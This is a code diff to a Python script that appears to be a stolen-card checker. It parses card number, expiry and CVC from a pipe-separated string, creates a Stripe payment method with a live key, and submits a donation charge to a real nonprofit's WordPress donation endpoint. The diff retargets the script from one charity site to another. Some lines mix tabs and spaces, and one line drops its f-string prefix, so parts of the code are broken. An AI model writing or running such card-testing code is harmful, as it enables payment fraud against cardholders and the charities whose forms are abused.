@@ -1,19 +1,18 @@
 import requests,re
 import random
 def Tele(ccx):
-    ccx=ccx.strip()
-    n = ccx.split("|")[0]
-    mm = ccx.split("|")[1]
-    yy = ccx.split("|")[2]
-    cvc = ccx.split("|")[3]
-    
-    if "20" in yy:
-        yy = yy.split("20")[1]
-    
-    r = requests.session()
-    random_amount1 = random.randint(1, 4)
-    random_amount2 = random.randint(1, 99)
-    
+	ccx=ccx.strip()
+	n = ccx.split("|")[0]
+	mm = ccx.split("|")[1]
+	yy = ccx.split("|")[2]
+	cvc = ccx.split("|")[3]
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]
+	r = requests.session()
+	
+	random_amount1 = random.randint(1, 4)
+	random_amount2 = random.randint(1, 99)
+
     headers = {
         'authority': 'api.stripe.com',
         'accept': 'application/json',
@@ -30,48 +29,47 @@ def Tele(ccx):
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
     }
     
-    data = f'type=card&billing_details[name]=Kai+Jas&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fdda83de495%3B+stripe-js-v3%2Fdda83de495%3B+card-element&key=pk_live_X8I5Jg4Cf3h2FfLSP7fZ2JwS'
+    data = 'type=card&billing_details[name]=Kuroshio&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&key=pk_live_51LqLrcKuYyCGsqVmBqB3jxUQeCs9GCzZG82Y0qXBJdE6WyvpXeKTBGpJ0xv0ObkWN98nTCwHInf77IpJv5Ka1ZEk00zcyPxtd9'
     
     response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    
     pm = response.json()['id']
     
     headers = {
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://www.massairspace.org',
-        'Referer': 'https://www.massairspace.org/donate/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'X-Requested-With': 'XMLHttpRequest',
+        'authority': 'mauritaniancommunity-dmv-usa.org',
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://mauritaniancommunity-dmv-usa.org',
+        'referer': 'https://mauritaniancommunity-dmv-usa.org/membership-donations/',
         'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
     }
     
     data = {
         'action': 'wp_full_stripe_inline_donation_charge',
-        'wpfs-form-name': 'inline-donations',
+        'wpfs-form-name': 'Dmv',
         'wpfs-form-get-parameters': '%7B%7D',
         'wpfs-custom-amount': 'other',
         'wpfs-custom-amount-unique': '1',
         'wpfs-donation-frequency': 'one-time',
-        'wpfs-billing-name': 'Kai Jas',
-        'wpfs-billing-address-line-1': '27 Allen St',
-        'wpfs-billing-address-line-2': '',
-        'wpfs-billing-address-city': 'New York',
-        'wpfs-billing-address-state': 'New York',
-        'wpfs-billing-address-zip': '10002',
-        'wpfs-billing-address-country': 'US',
         'wpfs-card-holder-email': 'ohmyqueenmedusa@gmail.com',
-        'wpfs-card-holder-name': 'Kai Jas',
+        'wpfs-card-holder-name': 'Kuroshio',
         'wpfs-stripe-payment-method-id': f'{pm}',
     }
     
-    response = requests.post('https://www.massairspace.org/wp-admin/admin-ajax.php', headers=headers, data=data)
-    result = response.json()['message']
+    response = requests.post(
+        'https://mauritaniancommunity-dmv-usa.org/wp-admin/admin-ajax.php',
+        headers=headers,
+        data=data,
+    )
     
-    return result
+    result = response.json()['message']
+	
+	return result
